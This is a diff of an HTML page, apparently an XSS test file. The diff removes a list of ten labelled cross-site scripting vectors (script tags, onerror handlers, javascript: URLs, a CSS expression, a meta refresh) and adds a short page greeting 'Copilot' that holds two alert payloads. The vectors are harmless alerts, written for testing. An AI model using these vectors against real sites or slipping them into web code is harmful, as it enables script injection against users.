@@ -1,41 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>XSS Mega Test</title>
-</head>
 <body>
-  <h1>XSS Test Page</h1>
-
-  <!-- Payload 1: classic script -->
-  <script>alert("XSS-1: script tag")</script>
-
-  <!-- Payload 2: image onerror -->
-  <img src="x" onerror="alert('XSS-2: img onerror')">
-
-  <!-- Payload 3: SVG with script -->
-  <svg><script>alert("XSS-3: svg script")</script></svg>
-
-  <!-- Payload 4: iframe javascript -->
-  <iframe src="javascript:alert('XSS-4: iframe')"></iframe>
-
-  <!-- Payload 5: body onload -->
-  <body onload="alert('XSS-5: body onload')"></body>
-
-  <!-- Payload 6: malformed tag -->
-  <scr<script>ipt>alert("XSS-6: malformed tag")</scr<script>ipt>
-
-  <!-- Payload 7: unicode trick -->
-  <img src=x onerror=alert`\u0058\u0053\u0053-7`>
-
-  <!-- Payload 8: style expression (IE only, legacy) -->
-  <div style="width:expression(alert('XSS-8: css'))">Test</div>
-
-  <!-- Payload 9: anchor javascript -->
-  <a href="javascript:alert('XSS-9: anchor')">Click me</a>
-
-  <!-- Payload 10: meta refresh -->
-  <meta http-equiv="refresh" content="0;url=javascript:alert('XSS-10: meta')">
-
+<h1>Xin chào Copilot</h1>
+<img src=x onerror=alert('XSS-Test')>
+<script>alert("XSS-2")</script>
 </body>
 </html>
